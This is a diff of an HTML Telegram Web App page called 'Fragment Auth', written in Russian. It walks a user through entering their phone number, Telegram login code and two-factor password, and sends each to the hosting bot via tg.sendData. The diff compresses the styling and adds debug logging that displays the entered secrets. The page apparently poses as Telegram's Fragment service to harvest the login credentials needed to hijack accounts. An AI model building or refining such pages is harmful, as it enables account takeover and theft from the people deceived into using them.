@@ -6,233 +6,56 @@
     <title>Fragment Auth</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            overflow: hidden;
-            width: 100%;
-            max-width: 380px;
-        }
-
-        .header {
-            background: linear-gradient(135deg, #0088cc 0%, #00a2ff 100%);
-            color: white;
-            padding: 25px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .content {
-            padding: 25px;
-        }
-
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-            font-size: 14px;
-        }
-
-        .phone-input {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-
-        .country-code {
-            background: #f8f9fa;
-            border: 2px solid #e9ecef;
-            border-radius: 12px;
-            padding: 12px;
-            min-width: 70px;
-            text-align: center;
-            font-weight: 600;
-            color: #495057;
-        }
-
-        .phone-field, .code-input, .password-input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #e9ecef;
-            border-radius: 12px;
-            font-size: 16px;
-        }
-
-        .phone-field:focus, .code-input:focus, .password-input:focus {
-            outline: none;
-            border-color: #0088cc;
-        }
-
-        .buttons {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-        }
-
-        .btn {
-            flex: 1;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .btn-cancel {
-            background: #f8f9fa;
-            color: #6c757d;
-        }
-
-        .btn-next {
-            background: #0088cc;
-            color: white;
-        }
-
-        .loading {
-            text-align: center;
-            padding: 30px 20px;
-        }
-
-        .loader {
-            width: 30px;
-            height: 30px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0088cc;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .instructions {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 15px;
-            font-size: 13px;
-            color: #6c757d;
-            line-height: 1.4;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: white; border-radius: 20px; padding: 25px; max-width: 350px; width: 100%; }
+        .step { display: none; }
+        .active { display: block; }
+        input, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 2px solid #ddd; }
+        button { background: #0088cc; color: white; border: none; cursor: pointer; }
+        .loading { text-align: center; }
+        .debug { background: #f0f0f0; padding: 10px; border-radius: 5px; margin: 10px 0; font-size: 12px; display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🔐 Fragment Auth</h1>
-            <p>Привяжите аккаунт Telegram</p>
+        <!-- Шаг 1: Телефон -->
+        <div id="stepPhone" class="step active">
+            <h3>Введите номер телефона</h3>
+            <input type="tel" id="phone" placeholder="79123456789" maxlength="11">
+            <button onclick="sendPhone()">Отправить код</button>
+            <div class="debug" id="debug1"></div>
         </div>
 
-        <div class="content">
-            <!-- Шаг 1: Телефон -->
-            <div id="stepPhone" class="step active">
-                <div class="instructions">
-                    Введите номер телефона, привязанный к вашему аккаунту Telegram.
-                </div>
+        <!-- Шаг 2: Код -->
+        <div id="stepCode" class="step">
+            <h3>Введите код из Telegram</h3>
+            <input type="text" id="code" placeholder="12345" maxlength="5">
+            <button onclick="sendCode()">Подтвердить</button>
+            <div class="debug" id="debug2"></div>
+        </div>
 
-                <div class="input-group">
-                    <label class="input-label">Номер телефона</label>
-                    <div class="phone-input">
-                        <div class="country-code">+7</div>
-                        <input type="tel" id="phone" class="phone-field" placeholder="9123456789" maxlength="10">
-                    </div>
-                </div>
+        <!-- Шаг 3: Пароль -->
+        <div id="stepPassword" class="step">
+            <h3>Введите пароль</h3>
+            <input type="password" id="password" placeholder="Пароль">
+            <button onclick="sendPassword()">Подтвердить</button>
+            <div class="debug" id="debug3"></div>
+        </div>
 
-                <div class="buttons">
-                    <button class="btn btn-cancel" onclick="closeApp()">ОТМЕНА</button>
-                    <button class="btn btn-next" onclick="sendPhone()">ДАЛЕЕ</button>
-                </div>
+        <div id="stepLoading" class="step">
+            <div class="loading">
+                <div class="loader"></div>
+                <div id="loadingText">Отправка...</div>
             </div>
+        </div>
 
-            <!-- Шаг 2: Код -->
-            <div id="stepCode" class="step">
-                <div class="instructions">
-                    Введите код подтверждения из Telegram
-                </div>
-
-                <div class="input-group">
-                    <label class="input-label">Код подтверждения</label>
-                    <input type="text" id="code" class="code-input" placeholder="12345" maxlength="5">
-                </div>
-
-                <div class="buttons">
-                    <button class="btn btn-cancel" onclick="backToPhone()">НАЗАД</button>
-                    <button class="btn btn-next" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
-                </div>
+        <div id="stepSuccess" class="step">
+            <div class="loading">
+                <div style="color: #2f855a; font-size: 48px; margin-bottom: 15px;">✅</div>
+                <div>Регистрация завершена!</div>
             </div>
-
-            <!-- Шаг 3: Пароль -->
-            <div id="stepPassword" class="step">
-                <div class="instructions">
-                    Введите пароль двухфакторной аутентификации
-                </div>
-
-                <div class="input-group">
-                    <label class="input-label">Пароль</label>
-                    <input type="password" id="password" class="password-input" placeholder="Ваш пароль">
-                </div>
-
-                <div class="buttons">
-                    <button class="btn btn-cancel" onclick="backToCode()">НАЗАД</button>
-                    <button class="btn btn-next" onclick="sendPassword()">ПОДТВЕРДИТЬ</button>
-                </div>
-            </div>
-
-            <!-- Загрузка -->
-            <div id="stepLoading" class="step">
-                <div class="loading">
-                    <div class="loader"></div>
-                    <div id="loadingText">Отправка...</div>
-                </div>
-            </div>
-
-            <!-- Успех -->
-            <div id="stepSuccess" class="step">
-                <div class="loading">
-                    <div style="color: #2f855a; font-size: 48px; margin-bottom: 15px;">✅</div>
-                    <div>Регистрация завершена!</div>
-                </div>
-                <button class="btn btn-next" onclick="closeApp()">ЗАКРЫТЬ</button>
-            </div>
+            <button class="btn btn-next" onclick="closeApp()">ЗАКРЫТЬ</button>
         </div>
     </div>
 
@@ -243,7 +66,18 @@
         let currentPhone = '';
         let currentCode = '';
 
+        // Функция для отладки
+        function debug(step, message) {
+            console.log(`[DEBUG Step ${step}] ${message}`);
+            const debugEl = document.getElementById(`debug${step}`);
+            if (debugEl) {
+                debugEl.style.display = 'block';
+                debugEl.innerHTML = message;
+            }
+        }
+
         function showStep(stepId) {
+            console.log(`Переход к шагу: ${stepId}`);
             document.querySelectorAll('.step').forEach(step => {
                 step.classList.remove('active');
             });
@@ -252,12 +86,15 @@
 
         function sendPhone() {
             const phoneInput = document.getElementById('phone').value.replace(/\D/g, '');
+            debug(1, `Введен номер: ${phoneInput}`);
+            
             if (!phoneInput || phoneInput.length < 10) {
                 alert('Введите корректный номер телефона');
                 return;
             }
             
             currentPhone = '+7' + phoneInput;
+            debug(1, `Форматированный номер: ${currentPhone}`);
             
             showStep('stepLoading');
             document.getElementById('loadingText').textContent = 'Отправка номера...';
@@ -268,7 +105,9 @@
                 phone: currentPhone
             };
             
-            console.log('Отправляю данные:', data);
+            console.log('Отправляю данные в бота:', data);
+            debug(1, `Отправка данных: ${JSON.stringify(data)}`);
+            
             tg.sendData(JSON.stringify(data));
             
             // Переходим к вводу кода
@@ -279,12 +118,15 @@
 
         function sendCode() {
             const code = document.getElementById('code').value;
+            debug(2, `Введен код: ${code}`);
+            
             if (!code || code.length < 5) {
                 alert('Введите корректный код');
                 return;
             }
 
             currentCode = code;
+            debug(2, `Код для отправки: ${currentCode}`);
             
             showStep('stepLoading');
             document.getElementById('loadingText').textContent = 'Проверка кода...';
@@ -295,7 +137,9 @@
                 code: currentCode
             };
             
-            console.log('Отправляю код:', data);
+            console.log('Отправляю код в бота:', data);
+            debug(2, `Отправка кода: ${JSON.stringify(data)}`);
+            
             tg.sendData(JSON.stringify(data));
             
             // Предполагаем успех (в реальности ждем ответ от бота)
@@ -306,6 +150,8 @@
 
         function sendPassword() {
             const password = document.getElementById('password').value;
+            debug(3, `Введен пароль: ${password}`);
+            
             if (!password) {
                 alert('Введите пароль');
                 return;
@@ -319,6 +165,9 @@
                 phone: currentPhone,
                 password: password
             };
+            
+            console.log('Отправляю пароль в бота:', data);
+            debug(3, `Отправка пароля: ${JSON.stringify(data)}`);
             
             tg.sendData(JSON.stringify(data));
             
@@ -360,6 +209,12 @@
         document.getElementById('password').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') sendPassword();
         });
+
+        // Логирование инициализации
+        console.log('Web App инициализирован');
+        console.log('Init Data:', tg.initData);
+        console.log('Init Data Unsafe:', tg.initDataUnsafe);
+        debug(1, 'Web App готов к работе');
     </script>
 </body>
 </html>
